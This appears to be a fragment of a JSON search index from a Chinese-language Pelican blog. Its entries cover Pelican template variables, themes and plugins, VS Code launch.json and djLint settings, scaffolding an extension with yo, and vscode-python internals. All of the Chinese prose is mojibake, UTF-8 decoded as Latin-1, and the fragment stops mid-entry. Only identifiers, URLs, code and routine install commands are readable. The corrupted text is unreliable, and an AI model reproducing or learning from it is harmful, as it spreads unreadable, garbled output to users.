æ¨¡æ¿é¡µauthor.html æ­¤æ¨¡æ¿å°†åº”ç”¨äºæ¯ä¸ªä½œè€…ï¼Œæ ¹æ® AUTHOR_SAVE_AS è®¾ç½® (é»˜è®¤å€¼: author/{slug}.html) ç”Ÿæˆè¾“å‡ºã€‚ å¦‚æœåˆ†é¡µåŠŸèƒ½å¤„äºå¯ç”¨çŠ¶æ€ï¼Œåˆ™åç»­çš„é¡µé¢é»˜è®¤ç±»ä¼¼ä¸º author/{slug}{number}.html è¿™ç§å½¢å¼ã€‚ å˜é‡ æè¿° author ä½œè€…å§“å articles ä½œè€…çš„æ–‡ç«  dates ä½œè€…çš„æ–‡ç« ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº articles_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ articles_page æ–‡ç« çš„å½“å‰é¡µé¢ articles_previous_page æ–‡ç« çš„å‰ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") articles_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº dates_page æ–‡ç« çš„å½“å‰é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åºã€‚ dates_previous_page æ–‡ç« çš„å‰ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") page_name AUTHOR_URL å…¶ä¸­ {slug} ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«åˆ é™¤ - å¯¹äºåˆ†é¡µé“¾æ¥æœ‰ç”¨ æ¨¡æ¿é¡µcategory.html æ­¤æ¨¡æ¿å°†åº”ç”¨äºæ¯ä¸ªç°æœ‰ç±»åˆ«ï¼Œæ ¹æ® CATEGORY_SAVE_AS è®¾ç½® (é»˜è®¤å€¼: category/{slug}.html) ç”Ÿæˆè¾“å‡ºã€‚ å¦‚æœåˆ†é¡µåŠŸèƒ½å¤„äºå¯ç”¨çŠ¶æ€ï¼Œåˆ™åç»­çš„é¡µé¢é»˜è®¤ç±»ä¼¼ä¸º category/{slug}{number}.html è¿™ç§å½¢å¼ã€‚ å˜é‡ æè¿° category åˆ†ç±»å articles åˆ†ç±»æ–‡ç«  dates åˆ†ç±»çš„æ–‡ç« ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº articles_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ articles_page æ–‡ç« çš„å½“å‰é¡µé¢ articles_previous_page æ–‡ç« çš„å‰ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") articles_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº dates_page æ–‡ç« çš„å½“å‰é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åºã€‚ dates_previous_page æ–‡ç« çš„å‰ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") page_name CATEGORY_URLï¼Œå…¶ä¸­ {slug} ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«åˆ é™¤ - å¯¹äºåˆ†é¡µé“¾æ¥æœ‰ç”¨ æ¨¡æ¿é¡µarticle.html æ­¤æ¨¡æ¿å°†åº”ç”¨äºæ¯ç¯‡æ–‡ç« , æ ¹æ® ARTICLE_SAVE_AS è®¾ç½® (é»˜è®¤å€¼: {slug}.html) ç”Ÿæˆè¾“å‡ºã€‚ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å˜é‡ã€‚ å˜é‡ æè¿° article æ˜¾ç¤ºçš„æ–‡ç«  category å½“å‰æ–‡ç« çš„åˆ†ç±»åç§° åœ¨æ–‡ç« æºæ–‡ä»¶å¤´éƒ¨åŒºåŸŸæ·»åŠ çš„ä»»ä½•å…ƒæ•°æ®éƒ½å°†è¢«è§†ä¸º article å¯¹è±¡çš„å­—æ®µã€‚ å­—æ®µåç§°å°†ä¸å…ƒæ•°æ®æ‰€ç”¨çš„åç§°ç›¸åŒï¼Œä¸è¿‡æ˜¯é‡‡ç”¨ å°å†™å­—æ¯å½¢å¼ ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥åœ¨æ–‡ç« å…ƒæ•°æ®ä¸­æ·»åŠ ä¸€ä¸ª FacebookImage çš„å­—æ®µï¼Œå¦‚ä¸‹æ‰€ç¤º: Title: I love Python more than music Date: 2013-11-06 10:06 Tags: personal, python Category: Tech Slug: python-je-l-aime-a-mourir Author: Francis Cabrel FacebookImage: http://franciscabrel.com/images/pythonlove.png è¿™ä¸ªæ–°çš„å…ƒæ•°æ®å°†ä½œä¸º article.facebookimage åœ¨ article.html æ¨¡æ¿ä¸­æä¾›è°ƒç”¨ã€‚ ä¾‹å¦‚,è¿™å…è®¸ä½ ä¸ºFacebookçš„å…¬å¼€å›¾å½¢æ ‡ç­¾æŒ‡å®šä¸€å¼ å›¾ç‰‡ï¼Œè¯¥å›¾ç‰‡éšæ¯ç¯‡æ–‡ç« è€Œä¸åŒ <meta property=\"og:image\" content=\" {{ article.facebookimage }} \"/> æ¨¡æ¿é¡µpage.html æ­¤æ¨¡æ¿å°†åº”ç”¨äºæ¯ä¸ªpageé¡µé¢ï¼Œ æ ¹æ® PAGE_SAVE_AS è®¾ç½® (é»˜è®¤å€¼: pages/{slug}.html) ç”Ÿæˆè¾“å‡ºã€‚ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å˜é‡ã€‚ å˜é‡ æè¿° page æ˜¾ç¤ºçš„é¡µé¢å¯¹è±¡ã€‚ä½ å¯ä»¥è®¿é—®å…¶æ ‡é¢˜ã€slugå’Œå†…å®¹ã€‚ æ¨¡æ¿é¡µtag.html æ­¤æ¨¡æ¿å°†åº”ç”¨äºæ¯ä¸ªæ ‡ç­¾tagï¼Œæ ¹æ® TAG_SAVE_AS è®¾ç½® (é»˜è®¤å€¼: tag/{slug}.html) ç”Ÿæˆè¾“å‡ºã€‚ å¦‚æœåˆ†é¡µåŠŸèƒ½å¤„äºå¯ç”¨çŠ¶æ€ï¼Œåˆ™åç»­çš„é¡µé¢é»˜è®¤ç±»ä¼¼ä¸º tag/{slug}{number}.html è¿™ç§å½¢å¼ã€‚ å˜é‡ æè¿° tag æ ‡ç­¾åç§° articles ä¸æ­¤æ ‡ç­¾ç›¸å…³çš„æ–‡ç«  dates ä¸æ­¤æ ‡ç­¾ç›¸å…³çš„æ–‡ç« ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº articles_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ articles_page æ–‡ç« çš„å½“å‰é¡µé¢ articles_previous_page æ–‡ç« çš„å‰ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") articles_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº dates_page æ–‡ç« çš„å½“å‰é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åºã€‚ dates_previous_page æ–‡ç« çš„å‰ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") page_name TAG_URL å…¶ä¸­ {slug} ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«åˆ é™¤ æ¨¡æ¿é¡µperiod_archives.html è¿™ä¸ªæ¨¡æ¿é¡µé¢ï¼Œå¦‚æœå®šä¹‰äº† YEAR_ARCHIVE_SAVE_AS çš„è·¯å¾„ï¼Œåˆ™æŒ‰å¹´ä»½å¤„ç†è¾“å‡ºæ–‡ç« ï¼Œ å¦‚æœå®šä¹‰äº† MONTH_ARCHIVE_SAVE_AS ï¼Œåˆ™æŒ‰æœˆä»½ï¼Œå®šä¹‰ DAY_ARCHIVE_SAVE_AS æŒ‰å¤©æ•°ã€‚ å˜é‡ æè¿° period ä¸€ä¸ªå…ƒç»„tuple(å¹´ æœˆ æ—¥)ï¼Œè¡¨ç¤ºå½“å‰æ—¶é—´æ®µã€‚ å¹´ å’Œ æ—¥ æ ¼å¼æ˜¯æ•°å­—ï¼Œè€Œ æœˆ æ˜¯å­—ç¬¦ä¸²ã€‚ å½“æ—¶é—´æ®µç»™å®šåªæœ‰å¹´ä»½æ—¶ï¼Œæ­¤å…ƒç»„ä¹Ÿæ‰åªåŒ…å« å¹´ ã€‚ å¦‚æœæ—¶é—´æ®µç»™å®šæœ‰å¹´å’Œæœˆç­‰ï¼Œå…ƒç»„å°†åŒ…å« å¹´ å’Œ æœˆ ã€‚ å¯¹è±¡ è¯¦ç»†è¯´æ˜æ¨¡æ¿ä¸­å¯ç”¨ä¸”æœ‰ç”¨çš„å¯¹è±¡å±æ€§ã€‚è¿™é‡Œå¹¶æ²¡æœ‰åˆ—å‡ºæ‰€æœ‰çš„å±æ€§ï¼Œè¿™é‡Œé€‰æ‹©æ€§åœ°åˆ—å‡ºæ¨¡æ¿ä¸­é€šå¸¸ä¼šç”¨åˆ°çš„å±æ€§ã€‚ æ–‡ç«  è¿™é‡Œ'æ–‡ç« 'çš„è¡¨è¿°åŸºäº source_path å±æ€§çš„å­—ç¬¦ä¸²å€¼ã€‚ å±æ€§ æè¿° author æ–‡ç« çš„ ä½œè€… authors æ–‡ç« çš„ ä½œè€… åˆ—è¡¨ category æ–‡ç« çš„ åˆ†ç±» content æ–‡ç« æ¸²æŸ“å†…å®¹ date è¡¨ç¤ºæ–‡ç« æ—¥æœŸçš„æ—¥æœŸæ—¶é—´å¯¹è±¡ date_format é»˜è®¤æ—¥æœŸæ ¼å¼æˆ–åŒºåŸŸè®¾ç½®æ—¥æœŸæ ¼å¼ default_template é»˜è®¤æ¨¡æ¿åç§° in_default_lang è¡¨ç¤ºæ–‡ç« æ˜¯å¦é‡‡ç”¨é»˜è®¤è¯­è¨€ç¼–å†™çš„å¸ƒå°”å€¼ lang æ–‡ç« æ‰€ç”¨è¯­è¨€ locale_date æŒ‰ date_format æ ¼å¼åŒ–çš„æ—¥æœŸ metadata æ–‡ç« å¤´éƒ¨å…ƒæ•°æ® dict save_as ä¿å­˜æ–‡ç« é¡µçš„ä½ç½® slug é¡µé¢çš„slugå†…å®¹ source_path æ–‡ç« æºæ–‡ä»¶çš„å®Œæ•´ç³»ç»Ÿè·¯å¾„ relative_source_path åŸºäº PATH çš„æ–‡ç« æºæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ status æ–‡ç« çŠ¶æ€ï¼Œå¯ä»¥æ˜¯'å·²å‘å¸ƒ'æˆ–'è‰ç¨¿' summary å±•ç¤ºçš„æ‘˜è¦å†…å®¹ tags æ ‡ç­¾ å¯¹è±¡åˆ—è¡¨ template ä½¿ç”¨çš„æ¨¡æ¿åç§° title æ–‡ç« æ ‡é¢˜ translations ç¿»è¯‘ æ–‡ç«  å¯¹è±¡åˆ—è¡¨ url æ–‡ç« é¡µçš„URL ä½œè€… / åˆ†ç±» / æ ‡ç­¾ è¿™é‡Œä¸‰ä¸ªå¯¹è±¡çš„è¡¨è¿°åŸºäº name å±æ€§çš„å­—ç¬¦ä¸²å€¼ã€‚ å˜é‡ æè¿° name å¯¹è±¡çš„åç§° [1] page_name ä½œè€…é¡µé¢åç§° save_as ä¿å­˜ä½œè€…é¡µé¢çš„ä½ç½® slug é¡µé¢çš„slugå†…å®¹ url ä½œè€…é¡µçš„URL [1] å¯¹äº Author å¯¹è±¡, æ¥è‡ª :authors: or AUTHOR. é¡µé¢Page è¿™é‡Œ'é¡µé¢page'çš„è¡¨è¿°åŸºäº source_path å±æ€§çš„å­—ç¬¦ä¸²å€¼ã€‚ å˜é‡ æè¿° author è¯¥é¡µ ä½œè€… content é¡µé¢æ¸²æŸ“å†…å®¹ date è¡¨ç¤ºpageé¡µæ—¥æœŸçš„æ—¥æœŸæ—¶é—´å¯¹è±¡ date_format é»˜è®¤æ—¥æœŸæ ¼å¼æˆ–åŒºåŸŸè®¾ç½®æ—¥æœŸæ ¼å¼ default_template é»˜è®¤æ¨¡æ¿åç§° in_default_lang è¡¨ç¤ºæ–‡ç« æ˜¯å¦é‡‡ç”¨é»˜è®¤è¯­è¨€ç¼–å†™çš„å¸ƒå°”å€¼ lang æ–‡ç« æ‰€ç”¨è¯­è¨€ locale_date æŒ‰ date_format æ ¼å¼åŒ–çš„æ—¥æœŸ metadata æ–‡ç« å¤´éƒ¨å…ƒæ•°æ® dict save_as ä¿å­˜pageé¡µçš„ä½ç½® slug pageé¡µçš„slugå†…å®¹ source_path pageé¡µæºæ–‡ä»¶çš„å®Œæ•´ç³»ç»Ÿè·¯å¾„ relative_source_path åŸºäº PATH çš„pageé¡µæºæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ status pageé¡µçŠ¶æ€ï¼Œå¯ä»¥æ˜¯'å·²å‘å¸ƒ'ã€'éšè—'æˆ–'è‰ç¨¿' summary å±•ç¤ºçš„æ‘˜è¦å†…å®¹ tags æ ‡ç­¾ å¯¹è±¡åˆ—è¡¨ template ä½¿ç”¨çš„æ¨¡æ¿åç§° title pageé¡µæ ‡é¢˜ translations ç¿»è¯‘ æ–‡ç«  å¯¹è±¡åˆ—è¡¨ url pageé¡µçš„URL Feedsè®¢é˜…æº feedå˜é‡åœ¨ç‰ˆæœ¬3.0ä¸­å‘ç”Ÿæ›´æ”¹ã€‚ æ¯ä¸ªå˜é‡ç°åœ¨éƒ½åœ¨åç§°ä¸­æ˜ç¡®æŒ‡å‡ºæ˜¯ATOMè¿˜æ˜¯RSSã€‚ ATOMä»ç„¶æ˜¯é»˜è®¤å€¼ã€‚ æ—§ä¸»é¢˜éœ€è¦å¯¹æ­¤è¿›è¡Œæ›´æ–°ã€‚ ä¸‹é¢æ˜¯feedå˜é‡çš„ä¸€ä¸ªå®Œæ•´åˆ—è¡¨: FEED_ATOM FEED_RSS FEED_ALL_ATOM FEED_ALL_RSS CATEGORY_FEED_ATOM CATEGORY_FEED_RSS AUTHOR_FEED_ATOM AUTHOR_FEED_RSS TAG_FEED_ATOM TAG_FEED_RSS TRANSLATION_FEED_ATOM TRANSLATION_FEED_RSS","tags":"æ–‡æ¡£","url":"/yq-doc-frame-pelican-theme-template.html","loc":"/yq-doc-frame-pelican-theme-template.html"},{"title":"è¯„è®º-åˆ†æç»Ÿè®¡æ”¯æŒ","text":"é€šè¿‡é…ç½®æ–‡ä»¶å¼•å…¥å³å¯. ä¸»è¦é€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªå˜é‡ # è¯„è®ºæ”¯æŒ DISQUS_SITENAME = \"\" # åˆ†æç»Ÿè®¡æ”¯æŒ GOOGLE_ANALYTICS = \"\" åˆ†æç»Ÿè®¡å›½å†…å¯ä»¥ä½¿ç”¨ å‹è¨€ , å¤šè¯´ , ç™¾åº¦ç»Ÿè®¡","tags":"æ–‡æ¡£","url":"/yq-doc-frame-pelican-issuse-dis.html","loc":"/yq-doc-frame-pelican-issuse-dis.html"},{"title":"æ–‡æ¡£","text":"ç›¸å…³èµ„æº: æ—¶åŒºç¼©å†™å¯¹ç…§è¡¨: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones","tags":"æ–‡æ¡£","url":"/yq-doc.html","loc":"/yq-doc.html"},{"title":"Jekyll","text":"åŸºäº ruby","tags":"æ–‡æ¡£","url":"/yq-doc-fram-Jekyll.html","loc":"/yq-doc-fram-Jekyll.html"},{"title":"nikola","text":"åŸºäºPythonçš„æ–‡æ¡£æ¡†æ¶, æ”¯æŒrst, è²Œä¼¼æ¯”è¾ƒå†·é—¨ ç›¸å…³èµ„æº: githubä»“åº“: https://github.com/getnikola/nikola.git å®˜æ–¹æ–‡æ¡£: https://getnikola.com/documentation.html ç¬¬ä¸‰æ–¹ç®€å•ä½¿ç”¨: https://blog.jiangfuquan.com/posts/nikola-blog/","tags":"æ–‡æ¡£","url":"/yq-doc-fram-nikola.html","loc":"/yq-doc-fram-nikola.html"},{"title":"æ–‡æ¡£æ‰˜ç®¡å¹³å°","text":"æä¾›æ­¤åŠŸèƒ½ç«™ç‚¹åŒ…æ‹¬ä½†ä¸ä»…é™äº ç äº‘ https://gitee.com/help/articles/4136#article-header0 , æ‰˜ç®¡éœ€è¦å®åè®¤è¯(éœ€ä¸Šä¼ æ‰‹æŒè¯ä»¶), æ”¾å¼ƒ. github https://docs.github.com/zh/pages/getting-started-with-github-pages coding å¾…è¡¥å……...","tags":"æ–‡æ¡£","url":"/yq-doc-page.html","loc":"/yq-doc-page.html"},{"title":"sugar-blog","text":"sugar-blog æ˜¯ä¸€ä¸ªåŸºäºTSå¼€å‘çš„å‰ç«¯åšå®¢æ¨¡ç‰ˆæ¡†æ¶ ç›¸å…³èµ„æº githubåœ°å€: https://github.com/ATQQ/sugar-blog æ–‡æ¡£: https://theme.sugarat.top","tags":"æ–‡æ¡£","url":"/yq-doc-fram-sugar-blog.html","loc":"/yq-doc-fram-sugar-blog.html"},{"title":"å°†Sphinxé¡¹ç›®è½¬æ¢ä¸ºBlog","text":"ä½¿ç”¨ ABlog æ’ä»¶ ç›¸å…³èµ„æº: githubåœ°å€: https://github.com/sunpy/ablog è‹±æ–‡æ–‡æ¡£: ABlog for Sphinx ç¬¬ä¸‰æ–¹ä¸­æ–‡æ–‡æ¡£: ABlog ç”¨äº Sphinx","tags":"æ–‡æ¡£","url":"/yq-doc-fram-sphinx-sp-to-blog.html","loc":"/yq-doc-fram-sphinx-sp-to-blog.html"},{"title":"Docutilsæ”¯æŒæŒ‡ä»¤","text":"åŸç”ŸDocutilsæ”¯æŒæŒ‡ä»¤è§ https://docutils.sourceforge.io/docs/ref/rst/directives.html","tags":"æ–‡æ¡£","url":"/yq-doc-lan-rst-directives.html","loc":"/yq-doc-lan-rst-directives.html"},{"title":"markdown","text":"å®˜ç½‘ä¸»é¡µ: https://daringfireball.net/projects/markdown/","tags":"æ–‡æ¡£","url":"/yq-doc-lan-md.html","loc":"/yq-doc-lan-md.html"},{"title":"reStructuredText","text":"æœ€åˆè²Œä¼¼æ˜¯ä¸“ä¸ºPythonæ–‡æ¡£æä¾›çš„ä¸€ç§æ ‡è®°è¯­è¨€ ç›¸å…³èµ„æº: å®˜ç½‘ä¸»é¡µ: https://docutils.sourceforge.io/rst.html#user-documentation ä¸‰æ–¹ä½¿ç”¨æ•™ç¨‹: Create Documentation with RST, Sphinx, Sublime, and GitHub åœ¨Pythonä¸­, æ˜¯ Docutils æä¾›äº†è§£ææ”¯æŒ æŒ‡ä»¤æ”¯æŒ åŸç”ŸDocutilsæ”¯æŒæŒ‡ä»¤è§ Docutilsæ”¯æŒæŒ‡ä»¤ æ‹“å±• çœ‹åˆ°ä¸ªå« MyST çš„æ‹“å±•, çœ‹æè¿°æ˜¯æ•´åˆäº† markdown å’Œ rst, å‚è€ƒ: MyST","tags":"æ–‡æ¡£","url":"/yq-doc-lan-rst.html","loc":"/yq-doc-lan-rst.html"},{"title":"launch.jsoné…ç½®","text":"å¦‚ä½•å¼•å…¥ç³»ç»Ÿç¯å¢ƒå˜é‡ ä½¿ç”¨ ${env:XXX} , å¦‚æƒ³åœ¨ç³»ç»Ÿçš„PATHå‰å¢åŠ æŸäº›è·¯å¾„ å†ä¼ ä¸‹å» { \"version\" : \"0.2.0\" , \"configurations\" : [ { \"name\" : \"Launch\" , //.. \"env\" : { \"PATH\" : \"/usr/local/xxx:${env:PATH}\" }, \"args\" : [], \"preLaunchTask\" : \"setupEnv\" , } ] }","tags":"å·¥å…·è½¯ä»¶","url":"/yq-util-vscode.html","loc":"/yq-util-vscode.html"},{"title":"vscodeä¸‹jinjaç‰ˆæœ¬htmlæ ¼å¼åŒ–","text":"ä½¿ç”¨ djLint æ’ä»¶ åœ¨ settings.json å…¨å±€é…ç½® \"[html][django-html][handlebars][hbs][mustache][jinja][jinja-html][nj][njk][nunjucks][twig]\" : { \"editor.defaultFormatter\" : \"monosans.djlint\" }, å…¶ä»–ç›¸å…³æ’ä»¶: Jinjaè¯­æ³•æç¤º: Jinja Snippets å‚è€ƒ: https://segmentfault.com/q/1010000043305483","tags":"å·¥å…·è½¯ä»¶","url":"/yq-jinja-format.html","loc":"/yq-jinja-format.html"},{"title":"vscodeè‡ªåˆ¶æ’ä»¶","text":"å¦‚ä½•åˆ¶ä½œvscodeæ’ä»¶ å…ˆå®‰è£…æ’ä»¶åŸºç¡€ä»£ç ç”Ÿæˆå·¥å…· npm install -g yo generator-code ä½¿ç”¨å®‰è£…çš„æŒ‡ä»¤ç”Ÿæˆä»£ç  yo code å¤§è‡´è¾“å‡º ? What type of extension do you want to create? New Extension ( TypeScript ) ? What 's the name of your extension? rst-fragment ? What' s the identifier of your extension? rst-fragment ? What 's the description of your extension? rst-fragment in editor ? Initialize a git repository? Yes ? Bundle the source code with webpack? No ? Which package manager to use? yarn Writing in /Users/yanque/Project/Code/Vscode/rst-fragment... create rst-fragment/.vscode/extensions.json create rst-fragment/.vscode/launch.json create rst-fragment/.vscode/settings.json create rst-fragment/.vscode/tasks.json create rst-fragment/package.json create rst-fragment/tsconfig.json create rst-fragment/.vscodeignore create rst-fragment/vsc-extension-quickstart.md create rst-fragment/.gitignore create rst-fragment/README.md create rst-fragment/CHANGELOG.md create rst-fragment/src/extension.ts create rst-fragment/src/test/extension.test.ts create rst-fragment/.vscode-test.mjs create rst-fragment/.eslintrc.json create rst-fragment/.yarnrc Changes to package.json were detected. Running yarn install for you to install the required dependencies. yarn install v1.22.17 warning package.json: No license field info No lockfile found. warning rst-fragment@0.0.1: No license field [1/4] ğŸ” Resolving packages... [2/4] ğŸšš Fetching packages... [3/4] ğŸ”— Linking dependencies... [4/4] ğŸ”¨ Building fresh packages... success Saved lockfile. warning Your current version of Yarn is out of date. The latest version is \"1.22.19\", while you' re on \"1.22.17\" . info To upgrade, run the following command: $ brew upgrade yarn âœ¨ Done in 17 .03s. Your extension rst-fragment has been created! To start editing with Visual Studio Code, use the following commands: code rst-fragment Open vsc-extension-quickstart.md inside the new extension for further instructions on how to modify, test and publish your extension. For more information, also visit http://code.visualstudio.com and follow us @code. ? Do you want to open the new folder with Visual Studio Code? Open with ` code `","tags":"å·¥å…·è½¯ä»¶","url":"/yq-util-vscode-cus-plugin.html","loc":"/yq-util-vscode-cus-plugin.html"},{"title":"vscodeçš„æ­£åˆ™æ›¿æ¢","text":"æœ‰æ—¶å€™æƒ³æ‰¹é‡å¤šæ–‡ä»¶ä¸€èµ·æ›¿æ¢. æ­£åˆ™ä½¿ç”¨æ­¤å¤„ä¸åšè¡¨, ä¸»è¦æ˜¯vscodeæ€ä¹ˆç”¨, å¯¹äºæœç´¢åŒºåŸŸæ­£åˆ™ç»„(å³åŠ äº†æ‹¬å·)çš„å†…å®¹, æŒ‰ç…§é¡ºåº, åœ¨æ›¿æ¢åŒºåŸŸçš„å¼•ç”¨æŒ‰ç…§é¡ºåº, ä¾æ¬¡ä¸º $1 , $2 ... å¦‚å¯¹æ‰€æœ‰ do some åé¢æŒ‡å®šå†…å®¹åŠ åç¼€. æœç´¢åŒº: do some([a-z]*) æ›¿æ¢åŒº: do some$1_xxx","tags":"å·¥å…·è½¯ä»¶","url":"/yq-util-vscode-re.html","loc":"/yq-util-vscode-re.html"},{"title":"åˆ›å»ºpelicané¡¹ç›®","text":"å…ˆå®‰è£…æ¨¡å— pip install pelican å¿«é€Ÿåˆ›å»º mkdir blog-pro cd blog-pro pelican-quickstart ç¼–è¯‘æ–‡æ¡£ pelican content å¯åŠ¨åˆ°æœ¬åœ° pelican --listen å¦‚æœå¸Œæœ›ç›‘å¬æ–‡ä»¶æ›´æ–°, å®æ—¶åˆ·æ–° pelican --autoreload --listen","tags":"æ–‡æ¡£","url":"/yq-doc-pelican-create.html","loc":"/yq-doc-pelican-create.html"},{"title":"æ’ä»¶","text":"å®˜æ–¹æœ‰ä¸€ä¸ªæ’ä»¶é›†åˆä»“åº“: https://github.com/getpelican/pelican-plugins","tags":"æ–‡æ¡£","url":"/yq-doc-pelican-plugins.html","loc":"/yq-doc-pelican-plugins.html"},{"title":"ä¸»é¢˜ä½¿ç”¨","text":"ç›¸å…³èµ„æº: å®˜æ–¹ä¸»é¢˜é›†åˆä»“åº“: https://github.com/getpelican/pelican-themes ä»“åº“ä¸»é¢˜é¢„è§ˆ: https://pelicanthemes.com ä½¿ç”¨å¼€æº/ä»–äººä¸»é¢˜ å¯ä»¥å°†å®˜æ–¹ä¸»é¢˜ä»“åº“é›†åˆcloneåˆ°æœ¬åœ°, ç„¶åç›´æ¥åœ¨ pelicanconf.py å®šä¹‰æƒ³è¦ç”¨çš„ THEME = \"theme-name\" ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ pelican-themes æŒ‡ä»¤ æ¯”å¦‚å®‰è£… flex ä¸»é¢˜ æ³¨è§£ ä¸ç®¡ç”¨å“ªä¸ªéƒ½éœ€è¦æœ¬åœ°æœ‰ æŸ¥çœ‹æœ¬åœ°å·²ç»å®‰è£…åˆ°pelicançš„ä¸»é¢˜ pelican-themes -l # åŠ  -v å¯ä»¥æŸ¥çœ‹å®‰è£…è·¯å¾„ # pelican-themes -v -l è‡ªå®šä¹‰ä¸»é¢˜ å¯å‚è€ƒ: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/themes.html é™¤äº†é…ç½® THEME , å¯åŠ¨æ—¶å€™å¯ä»¥æŒ‡å®šä½¿ç”¨æŸä¸ªä¸»é¢˜å¯åŠ¨ pelican content -s pelicanconf.py -t /projects/your-site/themes/your-theme","tags":"æ–‡æ¡£","url":"/yq-doc-pelican-theme.html","loc":"/yq-doc-pelican-theme.html"},{"title":"å…³äºvscode-pythonæ’ä»¶","text":"æ’ä»¶githubåœ°å€: https://github.com/microsoft/vscode-python æ­¤æ’ä»¶æä¾›äº†å¯¹Pythonç›¸å…³çš„æ”¯æŒ é—®é¢˜ åœ¨ Ubuntu 20 ä¸‹, å®‰è£…è‡ªè¡Œæ‰“åŒ…çš„ Python3.7 å, æ— æ³•åœ¨ theia ä¸­ä½¿ç”¨, vscode-python æŠ¥é”™: The Python path in your debug configuration is invalid. åŸå›  è‡ªè¡Œæ‰“åŒ…çš„ Python3.7 , è€Œ20å¯¹åº”çš„æ˜¯ Python3.8 è‡ªè¡Œå®‰è£…çš„ Python3.7 , éœ€è¦é…ç½®ç¯å¢ƒå˜é‡æ¯”å¦‚PATH, LDç­‰ éœ€è¦è®¾ç½®çš„ç¯å¢ƒå˜é‡æ— æ³•ç»™åˆ°æ’ä»¶é‡Œå», é™¤éåœ¨theiaå¯åŠ¨æ—¶å°±ç»™, æˆ–è€…ç›´æ¥å…¨å±€è®¾ç½® æºç è°ƒç”¨ å¯¹äºPythonç›¸å…³è°ƒç”¨, åº“ä½ç½®æ”¾åœ¨ python_files ç›®å½•ä¸‹, æœ€ä¸»è¦è·å–æ‰§è¡Œæ–‡ä»¶ä¿¡æ¯ä½¿ç”¨çš„æ˜¯ python_files/interpreterInfo.py import json import sys obj = {} obj [ \"versionInfo\" ] = tuple ( sys . version_info ) obj [ \"sysPrefix\" ] = sys . prefix obj [ \"sysVersion\" ] = sys . version obj [ \"is64Bit\" ] = sys . maxsize > 2 ** 32 åœ¨tsä¸­çš„è°ƒç”¨å¤§è‡´åœ¨ src/client/pythonEnvironments/common/externalDependencies.ts export async function shellExecute ( command : string , options : ShellOptions = {}) : Promise < ExecutionResult < string >> { const useWorker = false ; const service = await internalServiceContainer . get < IProcessServiceFactory > ( IProcessServiceFactory ). create (); options = { ... options , useWorker }; return service . shellExec ( command , options ); } æ²¡æœ‰æä¾›è®¾ç½®ç¯å¢ƒå˜é‡çš„æ–¹å¼","tags":"å‰ç«¯","url":"/yq-frontend-vscode-python.html","loc":"/yq-frontend-vscode-python.html"},{"title":"pelican","text":"pelican æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å¼€æºçš„é™æ€åšå®¢ç”Ÿæˆçš„æ¡†æ¶. åŸºäºPython å®‰è£…: python -m pip install pelican åœ¨æ¥è§¦ pelican ä¹‹å‰, 